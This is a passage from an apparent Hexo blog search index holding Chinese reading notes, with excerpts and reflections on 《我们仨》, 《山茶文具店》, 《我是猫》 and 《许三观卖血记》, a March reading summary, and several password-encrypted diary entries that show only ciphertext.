      <link href="/2020/reading-note/%E3%80%8A%E6%88%91%E4%BB%AC%E4%BB%A8%E3%80%8B%20%E6%9D%A8%E7%BB%9B/"/>
      <url>/2020/reading-note/%E3%80%8A%E6%88%91%E4%BB%AC%E4%BB%A8%E3%80%8B%20%E6%9D%A8%E7%BB%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%88%91%E4%BB%AC%E4%BB%A8%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="（一）-走上古驿道"><a href="#（一）-走上古驿道" class="headerlink" title="（一） 走上古驿道"></a>（一） 走上古驿道</h3><ol><li>因为事情往往是别扭的，总和希望或想象的不一致。  </li><li>时间不是金钱，时间是生命，  </li><li>我曾做过一个小梦，怪他一声不响地忽然走了。他现在故意慢慢儿走，让我一程一程送，尽量多聚聚，把一个小梦拉成一个万里长梦。<br>这我愿意。送一程，说一声再见，又能见到一面。离别拉得长，是增加痛苦还是减少痛苦呢？我算不清。但是我陪他走得愈远，愈怕从此不见。  </li></ol><h3 id="（一）"><a href="#（一）" class="headerlink" title="（一）"></a>（一）</h3><ol><li>在低等动物，新生命的长成就是母体的消灭。我没有消灭，只是打了一个七折，什么都减退了  </li><li>既然不受欢迎，何苦挨上去自讨没趣呢？锺书这一辈子受到的排挤不算少，他从不和对方争执，总乖乖地退让。  </li><li>沦陷区生活艰苦，但我们总能自给自足。能自给自足，就是胜利。锺书虽然遭厄运播弄，却觉得一家人同甘共苦，胜于别离。他发愿说：“从今以后，咱们只有死别，不再生离。”  </li><li>颐和园后山的松堂，游人稀少，我们经常去走一走后山。那里的松树千姿百态，我们和一棵棵松树都认识了。  </li><li>不著一字，尽得风流  </li><li>人间没有单纯的快乐。快乐总夹带着烦恼和忧虑。<br>人间也没有永远。我们一生坎坷，暮年才有了一个可以安顿的居处。但老病相催，我们在人生道路上已走到尽头了。  </li><li>世间好物不坚牢，彩云易散琉璃脆  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《山茶文具店》 小川糸</title>
      <link href="/2020/reading-note/%E3%80%8A%E5%B1%B1%E8%8C%B6%E6%96%87%E5%85%B7%E5%BA%97%E3%80%8B%20%E5%B0%8F%E5%B7%9D%E7%B3%B8/"/>
      <url>/2020/reading-note/%E3%80%8A%E5%B1%B1%E8%8C%B6%E6%96%87%E5%85%B7%E5%BA%97%E3%80%8B%20%E5%B0%8F%E5%B7%9D%E7%B3%B8/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E5%B1%B1%E8%8C%B6%E6%96%87%E5%85%B7%E5%BA%97%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="夏"><a href="#夏" class="headerlink" title="夏"></a>夏</h3><ol><li>泪腺仿佛变成了磁铁，瞬间吸收了世界上所有的悲伤。其中也包括小时候养的金鱼翻肚死去时的哀伤，以及寿司子姨婆去世时的悲恸。  </li><li>听说睡觉是克服酷热的防卫本能，所以我放任睡魔恣意作乱。  </li><li>我忍不住打开汽水喝了起来，冰冷的气泡好似小鱼般在嘴里蹦跳。喝了汽水，就像有一条冰冷的隧道贯穿身体中心。  </li><li>自古以来，代笔人就像所谓的影武者，跟战国时代武将和大名的替身一样。这些人绝对无法曝光，却对他人的幸福有所帮助，是受到感谢的职业。”  </li><li>书信除了正确向对方传达自己的想法，避免对方收到信时心生不快，也同样重要。  </li><li>信封内层使用了宛如冬日夜空般的深蓝色薄纸，期待能让收件人觉得，即使在黑暗中，也能感受到星星般的希望。  </li><li>我想借由灰色的墨水表达他们内心的谦卑，但那绝对不是悲伤的颜色，云层的后方必定有一片蓝天。  </li></ol><h3 id="秋"><a href="#秋" class="headerlink" title="秋"></a>秋</h3><ol><li>书信，就像是寄信人的分身。  </li><li>老人家常说，虽然只是擦身而过，也是前世累积的缘分。  </li><li>吾唯知足。<br>这句话劝人认清自我、知足常乐。  </li><li>“当初认识我老公时，我也很担心我的字太丑会吓跑他——以前发生过因为我的字太丑，结果对方提出分手的情况。如果爱上他之后才发生这种事的话很痛苦，所以在和我老公交往前，我就让他看了我写的字，问他，即使我的字写得这么丑，也没问题吗？然后我们才开始交往。”<br>“你的先生很温柔体贴。”<br>花莲小姐听到我这么说，害羞地微笑着。<br>“我老公说，世界上不可能有完美的人，而且像我这样的女人，如果身上没有缺点，会让人很不舒服，所以他反而松了一口气。他这句话彻底拯救了我，过去我曾因为字丑，觉得自己大概嫁不出去了。”<br>能如此温柔接受对方缺点的男人并不多。因为很多人在吵架时，会若无其事地提及对方最忌讳的事。  </li></ol><h3 id="冬"><a href="#冬" class="headerlink" title="冬"></a>冬</h3><ol><li>但始终找不到一个刚好可以卡进心灵缝隙的词语。  </li><li>大部分的人都认为，像机器印出来的那种铅字般的字很美，但是，活生生的人所写的文字除了漂亮以外，还必须有味道。  </li><li>当我好不容易来到瞭望台时，整张脸已经红得像枫叶，头顶几乎冒出热气，其他三个人却已气定神闲地站在瞭望台上看风景。  </li><li>我的心，就像一颗小种子冒出了柔软的芽，轻轻推动了我的心房。<br>些微的征兆渐渐变成了明确的胎动。一直排不出来，令我痛苦不已的东西，如今突然寻求出口。<br>我想要写，必须赶快释放，马上，就在这里。那种感觉就像突然要生孩子。  </li><li>走球人生”是清太郎先生的父亲以前自创的词。他认为地球就像一颗大橡皮球，自己的人生就像自由地走在这颗球上。也许他是用幽默的方式形容自己在世界各地忙碌奔波的人生吧。  </li><li>即使已经离开了地面，即使不再进行光合作用，这些花仍然有生命。死亡的同时，或许也代表了永生。我在进行作业时，也一直在思考这个问题。  </li><li>火很奇妙，无论看多久都不会腻。数千、数万、数亿句话语被火包围，升上了天空。我吃着温热的年轮蛋糕，怔怔地看着这一幕。  </li></ol><h3 id="春"><a href="#春" class="headerlink" title="春"></a>春</h3><ol><li>长大成人后，什么事最轻松？就是不需要再和不想往来的人继续来往，不是吗？男人遇到这种事都会不干不脆，但女人很自由，可以自己选择朋友。勉强和讨厌的对象当朋友，只会让自己更有压力，彼此都很累。我不想做这种事，因为我是大人。”  </li><li>在未来的人生中，我不希望再欺骗自己了。  </li><li>一旦接下了工作，不管需要满地爬还是倒立，即使是吐血，都必须完成。  </li><li>仔细想想，每个人其实都看不见自己。虽然可以看到手和手指，但除非照镜子，否则看不见自己的后背和屁股。无论任何时候，周遭人们所看到的我，都比我看到的自己更多。  </li><li>仔细一看，发现樱花的颜色并非完全一样，有的颜色比较深，有的比较浅，深浅并不相同。有些含苞待放，有些已成落英，每朵花以各自的节奏绽放。不光是花，黑色弯曲的树干、细弦般的树枝，以及开始冒芽的树叶也都很美。只要敞开心房，就可以听到樱花诉说的话语。樱花和我越来越亲密，我在心里轻轻抱住了樱树。  </li><li>如果可以预测人生的一切，那么一定很无聊。  </li><li>石板路左右两侧是苍郁的树林，树根被松软的苔藓盖住了。我忍不住停下脚步深呼吸。枝头刚抽芽的新绿宛如无数点亮的蜡烛，这些新生不久的树叶照亮了暗夜。  </li><li>“与其苦苦追寻失去的东西，还不如好好珍惜自己眼前拥有的东西。”  </li></ol><h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>因为自己本身就很喜欢文具、写字之类的东西，所以在看这本书的时候，感觉很温馨，是我向往却永远做不到的事情。<br>我没有什么才华，一切都平平淡淡，唯独遭受的挫折波澜起伏。<br>其实我也很想拥有一个能为之骄傲的技能，可我仔细想了想。<br><strong>没有</strong>。<br>不管是想要去做的，还是已经在做的，都没有能令我骄傲的。<br>我拥有的只是普普通通的世界，没有精彩的风景，却有自己心满意足的平淡，这样也挺好的呀。  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《我是猫》 夏目漱石</title>
      <link href="/2020/reading-note/%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%20%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/"/>
      <url>/2020/reading-note/%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%20%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><ol><li>首先，那张本应长着毛的脸竟然光溜溜的，就像个烧水壶。后来我也遇到过不少猫族成员，可是从不曾见过有哪一只残废到如此地步。  </li><li>如若绘画，皆须摹写自然本身。天上有星辰，地上有露华，空中有飞禽，地面有走兽，池里有金鱼，枯木有寒鸦。大自然乃是一幅活灵活现的画面。’你觉得怎样，如果想要画出像样的画来，你也试着写写生好了。”  </li><li>在赤松林之间点缀出两三层红色的红叶如往昔梦境一般谢落，洗手钵旁边的交替飘落花瓣的红白山茶花也已散尽。照在南面三间半 长的廊子上的冬天的阳光早早就已倾斜，几乎天天刮起寒冷的北风，我睡午觉的时间仿佛也被缩短了。  </li></ol><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><ol><li>咱猫族遇到这类问题，可就单纯多了。想吃就吃，想睡就睡；气愤时尽情地发火，伤心时死命地哭泣。首先，绝不写日记之类没用的玩意儿，因为根本没有必要写。像我家主人那样表里不一的人，也许还有必要写写日记，暗地里发泄一通自己见不得人的真面目。而我们猫族，行走坐卧、拉屎撒尿，皆是真正的自己，所以没有必要那么煞费苦心地掩盖自己的真面目。有写日记的工夫，还不如在檐廊上美美地睡一觉呢！  </li><li>此时第三条真理又蓦地闪现出来：临危之际，能为平日所不能为之事，此谓之“天佑”。  </li><li>我又体验到了第四条真理：凡世间安乐，皆须经由困苦而得。  </li><li>我们猫族笑的时候是将鼻孔弄成三角形，咕噜咕噜地振动喉咙，人类自然不知道。  </li><li>我只感觉凄凉无比。日暮、阵亡、衰老、世事无常，这种种念头在我头脑中飞速旋转起来。常听说有些人上吊自杀，恐怕就是在这种心境下冒出寻死之念的吧！  </li><li>一想到那位小姐突然害了那种病，我就满怀飞花落叶之感。我全身的活力犹如举行了大罢工，顿觉颓然无力，  </li><li>‘Many a slip, twit the cup and the lip  </li><li>我觉得，人类这种东西，为了消磨时间而强迫自己做口舌运动，除了会胡诌些并不可笑的事，然后莫名其妙地傻笑一通外，一无所能。  </li><li>一言以蔽之，不论是主人、寒月，还是迷亭，都是些太平盛世的逸民，尽管他们像丝瓜一样随风摇曳，却又装得超然物外，其实，他们既有凡心，又有贪欲。竞争之念、好强之心即使在他们的日常谈笑中，也隐约可见其端倪。  </li><li>替三毛姑娘去死，我当然心甘情愿，但是，如果不受那份罪就死不成的话，不论替谁去死我也不愿意！  </li></ol><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><ol><li>‘秘密’这东西可真可怕，任凭你怎么遮掩，也说不定会从什么地方暴露的。  </li><li>“那是十九世纪卖剩下了，二十世纪又赶上滞销的面相。”迷亭总是说些俏皮话。  </li><li>“不过，嫂夫人！我吹牛，只是为了吹牛，而那个女人吹牛，却是心怀鬼胎，话中有诈噢。性质恶劣。假如不把雕虫小技与天生的滑稽区别开来，那么，就连喜剧之神也不得不喟叹世人有眼无珠喽。”  </li><li>猫脚有形无声，不论走到任何地方，从未发出过笨重的脚步声。宛如腾云驾雾，水中敲磬，洞里鼓瑟，又如“尝遍人间醍醐味，不言冷暖我自知”。  </li></ol><h3 id="四"><a href="#四" class="headerlink" title="四"></a>四</h3><ol><li>真理虽然在我这里，权力却在别人那里。此时只有两条路：或委曲求全，唯命是从，或偷偷摸摸地我行我素。  </li><li>人生的奋斗目标不在于善辩，而在于行动。只要事情能够按照自己的意愿顺利进展，人生的目标也就达成了。若是没有辛苦，没有忧心和争论，事情却又顺利进展的话，那么人生目的便是乐天地达成了。  </li></ol><h3 id="五"><a href="#五" class="headerlink" title="五"></a>五</h3><ol><li>说到底，爱情本是宇宙间的活力源头。上自天神丘比特、宙斯，下至土里鸣叫的蚯蚓、蝼蛄，一旦陷入此道，无不心神憔悴，此乃万物之习。  </li><li>世上有一种人，一面干着坏事，一面却自以为是正人君子。若这是由于他们自信没有罪孽在身，而如此天真，倒也无妨，然而，他人遭的难总不会因其天真而减少。这类绅士淑女也和这个女仆是同类。  </li><li>这种时候，最能使自己安心的捷径，便是认定那样的事不会发生。人总是把无能为力的事情当作不会发生。首  </li></ol><h3 id="七"><a href="#七" class="headerlink" title="七"></a>七</h3><ol><li>据说人世上通行的爱的法则的头一条是：“于己有利时，则须爱人。”  </li><li>若问天下什么最有趣儿？莫过于吃到没吃过的东西，看到没看过的光景更开心的了。  </li><li>正如大自然嫉恨真空一样，人类也是厌恶平等的。  </li><li>我在回家的路上还边走边想：人们脱掉短外褂，脱掉裤衩，力求平等而变得赤裸裸的。可是，在赤裸裸的人群中，又跳出来一个赤裸裸的豪杰制服了其他人。可见，不管怎么脱得赤裸裸的，也是不可能获得平等的。  </li><li>，是对方的事；哭，是我的事。主人从一开始就以让我叫为目标，却只命令“打两下”，他以为这命令之中连属于我的自由的叫唤也都包括在内了，真是太不像话了！简直就是不尊重别人的人格！是欺负猫！这  </li></ol><h3 id="八"><a href="#八" class="headerlink" title="八"></a>八</h3><ol><li>据说古希腊有个名叫埃斯库罗斯的作家，此人拥有一个学者和作家共通的脑袋。我所说的学者和作家共通的脑袋，就是秃头的意思。要问为什么头秃了呢？一定是因为头部营养不良，缺乏生长头发的足够活力。学者和作家大抵都是用脑最多的人，而且很穷。因此，学者和作家的头发都因营养不良而光秃秃的。<br>且说，伊索克拉底 也是一名作家，自然也要秃头的。他有着一颗光溜溜的金橘头。  </li><li>“要说没办法，也的确没办法。不过你也不要那么固执。人一有棱角，在人世上与人打交道，就要吃苦，吃亏呀！圆滑的人，无论转到哪里都吃得开；而有棱有角的话，不但转的时候费力，而且每转动一次，楞角都要被磨得很疼。毕竟这世上不是只有自己一个人，不可能人人都让你满意呀！唉，怎么说呢，跟有钱人作对肯定要吃亏的，只能让自己忧烦，伤害身体，没人说你好。而对方毫发无损。人家坐在家里支使别人就把事情办了。‘胳膊拧不过大腿’，明摆着斗不过的嘛。固执倒也没什么，但是若一条道走到黑，顽固不化，就会影响自己的学习，给日常工作带来麻烦，到头来只能是得不偿失！”  </li><li>不管自己怎么了不起，世上之事毕竟不可能万事如意。既不能使落日回升，又不能使加茂川倒流。能够做到的，唯有约束自己的心灵。  </li></ol><h3 id="九"><a href="#九" class="headerlink" title="九"></a>九</h3><ol><li>说到底人类的一切研究，都是为了研究自我。所谓天地、山川、日月、星辰，无非是自我的别名。因为没有人能找到不研究自我的研究项目。假如人们能够跳出自我，那么，当他跳出去的刹那间，便失去了自我。而且，研究自我，除了自身，是不会有人为自己做的。即便想研究别人或请别人研究自己，也是不可能实现的。  </li><li>在自知自己愚蠢者面前，一切自命不凡的人都应该低下头来，自惭形秽的。  </li><li>倘若让我执掌天地，我将一口喝尽西江水；倘若让天地管束于我，我不过是陌上一粒微尘。我当然要问：天地与我，可有何干？  </li><li>说不定整个社会便是疯人的集合体。疯人们聚在一起，互相残杀，互相争吵，互相谩骂，互相争夺。这些疯子构成的社会整体，或许犹如细胞一样不断死亡又再生，如此反复无穷地生活下去的。说不定其中一些略辨是非、明白道理的人，反而碍事，于是创建了疯人院，把这些人关了进去，让他们不能出来捣乱。于是，被幽禁在疯人院里的是正常人，而在疯人院外面发疯的才是真疯子呢。当疯子势单力孤时，总是被人们看作是疯子；但是，当他们成为一个群体，有了势力之后，便成为健全的人了吧。大疯子滥用金钱与势力，役使众多的小疯子干坏事，却被人们赞誉为‘杰出的人’，这种例子不可胜数。真是越想越不明白了！ ”  </li></ol><h3 id="十"><a href="#十" class="headerlink" title="十"></a>十</h3><ol><li>告朔饩羊  </li><li>遍观人世间，往往越是无德无能的庸人，越是肆意妄为，削尖脑袋想要爬上不胜任其职的官位，而这种性格，早在孩童时期就已经萌芽了。既然根深蒂固，绝非靠教育和熏陶便可以治愈的，因此趁早断掉此念为好。  </li><li>人心眼越多，心眼就越是作祟，成为不幸的源泉。多数妇人比男人不幸，都怪心眼太多了。  </li><li>正所谓对于关系淡薄之人，同情心自然也淡薄。为一个素昧平生的人皱眉、流泪或叹息，绝不是人类的自然情感。我很难认可人类是那么富于同情心和怜悯心的动物。不过是作为生而为人的一种义务，才常常为交际而流几滴泪，或是装出同情给别人看罢了，即所谓虚假的表情。说到底，是一种非常吃力的艺术。此类擅于装腔作势的，被称为“富有艺术良心的人”，深受人们的敬重。因而，再也没有比受敬重的人更靠不住的了。只要试一试，立见分晓。  </li></ol><h3 id="十一"><a href="#十一" class="headerlink" title="十一"></a>十一</h3><ol><li>发明棋盘的是人。如果说人类的癖好反映在了棋盘上，那么，即便说进退维谷的棋子儿的命运体现了龌龊的人类本性也不为过。假如从棋子儿的命运可以推论人类本性的话，便不能不断言：人类喜欢用小刀把海阔天空的世界零切碎割，圈出自己的地盘，画地为牢，任何时候都不越雷池一步。一言以蔽之，也可以说人类是在自寻烦恼吧。  </li><li>在人生紧要关头，才见滑稽与崇高的巨大反差。  </li><li>“所以说呀，‘贫时为贫所缚，富时为富所缚，忧时为忧所缚，喜时为喜所缚’。才子毙于才，智者败于智，  </li><li>出生时，无人深思熟虑；临死时，却无人不烦恼。  </li><li>拘泥于陋习，勉强自己踏入婚姻，是违背自然法则的野蛮风气。  </li><li>我等渴望自由，并得到了自由；得到了自由，却又感到不自由，因而烦恼不已。  </li><li>看似悠闲的人们，若叩其内心深处，总会听到悲哀的声音。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>猫猫很可爱，夏目也很有趣。  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《许三观卖血记》 余华</title>
      <link href="/2020/reading-note/%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B%20%E4%BD%99%E5%8D%8E/"/>
      <url>/2020/reading-note/%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B%20%E4%BD%99%E5%8D%8E/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="第1章-中文版（再版）自序"><a href="#第1章-中文版（再版）自序" class="headerlink" title="第1章 中文版（再版）自序"></a>第1章 中文版（再版）自序</h3><ol><li>马提亚尔说：“回忆过去的生活，无异于再活一次。”写作和阅读其实都是在敲响回忆之门，或者说都是为了再活一次。  </li></ol><h3 id="第4章-意大利文版自序"><a href="#第4章-意大利文版自序" class="headerlink" title="第4章 意大利文版自序"></a>第4章 意大利文版自序</h3><ol><li>我学会了如何去寻找准确有力的词汇，如何去组织延伸中的句子；一句话，就是我学会了在标准的汉语里如何左右逢源，驶驭它们如同行走在坦途之上。  </li></ol><h3 id="第16章"><a href="#第16章" class="headerlink" title="第16章"></a>第16章</h3><ol><li>事情都是被逼出来的，人只有被逼上绝路了，才会有办法，没上绝路以前，不是没想到办法，就是想到了也不知道该不该去做。  </li></ol><h3 id="第21章"><a href="#第21章" class="headerlink" title="第21章"></a>第21章</h3><ol><li>我现在想明白了，我以前什么事都先想着男人，想着儿子。只要他们吃得多，我宁愿自己吃得少；只要他们舒服，我宁愿自己受累。现在我想明白了，往后我要多想想自己了，我要是不替自己着想，就没人会替我着想。  </li></ol><h3 id="第26章"><a href="#第26章" class="headerlink" title="第26章"></a>第26章</h3><ol><li>“爹，你是不是要带我去吃面条？”<br> 许三观不再骂一乐了，他突然温和地说道：“是的。”  </li></ol><h3 id="第33章"><a href="#第33章" class="headerlink" title="第33章"></a>第33章</h3><ol><li>他的泪水在他脸上纵横交错地流，就像雨水打在窗玻璃上，就像裂缝爬上快要破碎的碗，就像蓬勃生长出去的树枝，就像渠水流进了田地，就像街道布满了城镇，泪水在他脸上织成了一张网。   </li><li>这就叫屌毛出得比眉毛晚，长得倒比眉毛长。  </li></ol><h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>真的很感动，是个小故事，但却格外感人。文字朴实无华，却直击人心。第一次，我看小说看得这么情感流露。好感人啊，尤其是在许三观虽然嘴上说着拒绝，但是背后又自己去完成。真的是典型的刀子嘴豆腐心的好人。表面凶巴巴，很冷淡，内心却格外的温柔，热心，善良。<br>不管是对妻子，还是明明不是自己的儿子却养育了好几年的一乐，都格外的好。若能遇上这样的男人，也是很幸运了。<br>危难时不抛弃，喜乐时同分享。  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3月小结</title>
      <link href="/2020/reading-note/3%E6%9C%88%E5%B0%8F%E7%BB%93/"/>
      <url>/2020/reading-note/3%E6%9C%88%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="总记"><a href="#总记" class="headerlink" title="总记"></a>总记</h2><p>这个月看的电影=0，又懒了，平时就在那刷消息，浪费时间，又很无聊，害，没话说了。</p><a id="more"></a><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><ol><li>爱你就像爱生命</li><li>我是猫</li><li>挪威的森林</li><li>谁动了我的奶酪<br>共看完了4本书，还有一本诗经，莫有看完，准备慢慢欣赏。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-3-30</title>
      <link href="/2020/diary/2020-3/2020-3-30/"/>
      <url>/2020/diary/2020-3/2020-3-30/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="b5aaa9af45f13bbb530c7df124ec7aecf261b6de956e7cbecfc6789e192dd15a">e32c27e47419b87d293b9e8ce412adf8d55d77683868e94d7b04248aac169e063f4ae2aaf2acd7649d51c8a79455fa620f16574b0af07917ebbb08bd3a04e1f89beba060979e4387769e3e041ae22d002d6782a1609bd1ed7623258ab9fcd49822aa93fb3f92e5f4cbf9b29d88edda27f5b24675ab99aaa71ee9fbc03252b7ce5810dea0d6792f25f1bd3511f52fce0c3007f8ea9a8177a5162c2b21efd896e6fa59423a456f836be7db4a1c2fc9cca7ee6ee7cea79517c7909f4057e3e9317fb13966cfabbb7ec945cef658800e9e9f3ca7ca76526ff3467fce580a6e7dcc3dd6540b5eb53a1c375b0dab24e7aa4475cf974f2ee98ab2369de39c536badeb35cb9b15cecb4d7d727d1dd22106325463af23597e225c3a8f6d0ee8aa42b93868e44fa766d231913a057764d032086c2b0759362d50fc958520332238365ce53cb6a9e2a2618cfa7a9f929609dbf7d75eded314a318f05e4f3386f26efc2d3ba1e9d8df59a5643184e4e677592514f2482612c17b04516c697cc83c2a65a40608d79c271d7c6a3d89033cedceff68d71673b8ae0d421d70ec1195a23c4b26b9ba47f7f0a269769b8bbd5406ba58fb71ccfab1c3e3adbfa51ed139ca8cae4559a40b3a4c04fbbd98b26875126e13ffde23df3ee6d92ccfeca7149553c7428b7c63913be7303a364eb528705cd281dd0abc0a4687634306b17fe8ab60996092055795d7aae4c6eb2340089f472a60d918362abcc7579116c1c5e43da92c9b5dfd4894acf54c5877f6da26f1457b6aede02948855a3fe87c986356a49d7e504c6f9ad2beee197f6db6dd94a28c0aee459e88bfc45bf7e9a875788c910f8d760287352afe536a62a4765aba0a789551de58a61c52fdb74b2ce3d1d18afa4c446baa68d53cdb454375aa602966906dc2df659b0c40c4bbe919fe2630abfbceed5005eb4fb283d62b1abd01138118260db7c03bc448c2ab391335282932622c5e3d3ce5cea8f52561bc0ca5fc419a2d9f7411b8b16e7e9ae98a92978c6e0c4f9df54df8ceb549849e23193f21224da3ec765579e379050d382279411dd89bb66536942eae3ebc4972ebfd180531ac2ecbb6fc04776798ab1b4bccfcad1847001a9d54ee310d1c6c238f96fc641c0eeb8cad032ab01f553728d49a5efed9cc383aa52aa3772d6fdd1d5e5252099946f22d8102cf32a741263577fe3659e31b99e74c488c693f0808e09b7c7e0ce23422679f688b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-3-29</title>
      <link href="/2020/diary/2020-3/2020-3-29/"/>
      <url>/2020/diary/2020-3/2020-3-29/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="a85dcd67f0788e1aec15da8429e70f65c8070046288f1904469eecfb9a7c93b8">e32c27e47419b87d293b9e8ce412adf8d55d77683868e94d7b04248aac169e068054def8eff7acbc88a8f3526a35f4008a6f379c72676d4d73b6bfb04409408396e6e580439644d58ad8ad5cc61dcab34b9d63a6d224715f4fb065dab6e54bb246e9fce047e1c38762b614e5d7fff47ca414e43d30552a17f12f3eb9a7879d72614f011d8ca747349fece8799f591fe7b52974a7138f4195deeb2ce765aff272e3cc7f01b185611608093a4759395d4994e2f369566403508b94be528b97271163c95678fe40192cf683cedb09a9b7486248961dc5fb29e61ae5893a07ee201247309446250a53296dafbcc9988c62aec38c46e3fa74569bbbc324ac537e50067b9b706d1c524b703e9542033c3816c65869f55aaf55a646e84764b7dc04d271e32f1cef56520afd4d2b74a450f38ffa505b4440a08416cbde6fd99470c9db5c5cf8c648325170b0e02c6a1fa8e3ead82bce221bff770a546fb1cb3e3eb14bd132bc4b9b65ac06cda0028f2791bc2832536d3c826b8ee3906687b368b046d5913a503668a53666944bab151489698ecf9e6736a9c6327fe8d5277390a259f746d5c826c7dad6756e239253d8e5f4fc7e2529d61c0fd7da985fa862f0c48443b81f658b4132e8e0ef89b106f01cbfdd2522c9781c20360821b52699a5d8deade421170bd5ab952d4f00b018ac757e49da5e647533b8dc6d7457e9d7c866cf575b70187c61ba2f659b4691abe4b7a6e58a394e8ee7470dd3d0065d63def8964f2664f903313e22657238a3865cc64e39ffb08e4672f3761c8134dd5aa244a8169cac79b21615de30eed9f460b035021e70bf6e8a6bc1d3e0444acc055da6161045e82961df3320d9a144fdf4d56076770e9bf1c2d4ecc6d37b9617be7023f4737619ee0fb09053ac09b26ec4d5819f61051092a31edb63edf34a40e1fb9c8d3831e2dbf60e7db86ba2e420779edb4beee0ae7b19f7d525390a460084f5cc23800afa2fdd735f9a3e856fe5dfb8c0900b3702b3050da051b963aab55d0977a8bbcdacce7ba1a20df2824c271d4a7dfc8b37b4c8b4a5cab3fc06f258e8e96baba54e01f0320a266e7d4325a72877883738a8224f7c5593ac9ab44aae8703c12a79e4b83a6039d61095cd51f0e0064daba8635f8f9fb54d65042c87edf96804500c1e2978cf7827fee4f976bdca6ef368a887df6e1b1e4c9caeea76305dc230c2f189369e394319283c369aeb1313ef7bffe878826a435968c84ac15b25e9fcc555f67e365db2de6a06b3bc8121dea98164dfaaa1a6ab656bca7fc9e00d4d53253f4b3f184ed62e6ea838041103036bf1f0d5e648d6a8393bec8180f16cee02ff72056ccd0e45a27bcef211325a7c7d78065560933ea22d040e52350893a27ecec37a08296e2d8de534fab52402cc499e280e8cd0f8bdcbd38500c027bd73290d6bd990faf01eef742ef95ed76ae8677650fb3a32cc5301e7c05eb0e5b54981f885d802f031ba22c484405725408e37acf70d68877756351f9d850ae68864246aeb3654b301d61f4484c517237fb231d127907693b0e9355b1b5730853ba7550964fea2e1f0358f062bbb206689cdda25e5be4c86d4abb834c06baf5da84744bdfffa9a6cd01c3913d446a410db3f435b3646a4f53f860ed559c43d51c337343e6090a7902b70bde7a67167dfd7f34eaa8e6f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-3-28</title>
      <link href="/2020/diary/2020-3/2020-3-28/"/>
      <url>/2020/diary/2020-3/2020-3-28/</url>
      
